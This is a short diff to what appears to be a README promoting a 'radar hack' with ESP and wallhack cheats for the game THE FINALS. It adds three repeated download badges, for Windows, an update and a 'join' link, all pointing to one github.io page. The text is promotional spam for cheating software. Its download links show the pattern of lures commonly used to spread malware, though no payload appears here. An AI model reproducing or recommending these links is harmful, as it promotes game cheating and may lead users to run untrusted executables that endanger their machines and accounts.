@@ -6,6 +6,9 @@ THE FINALS is fast, chaotic, and packed with destruction. Enemies can flank from
 
 Pair it with **ESP and wallhack**, and you’ll have complete battlefield awareness from every angle.
 
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)](https://the-finals-radar-hack.github.io/.github/)
+[![Download Update](https://img.shields.io/badge/Download-Update-green?logo=windows\&style=for-the-badge)](https://the-finals-radar-hack.github.io/.github/)
+[![kJoin Now](https://img.shields.io/badge/Join-Now-yellow?logo=windows\&style=for-the-badge)](https://the-finals-radar-hack.github.io/.github/)
 
 ---
 
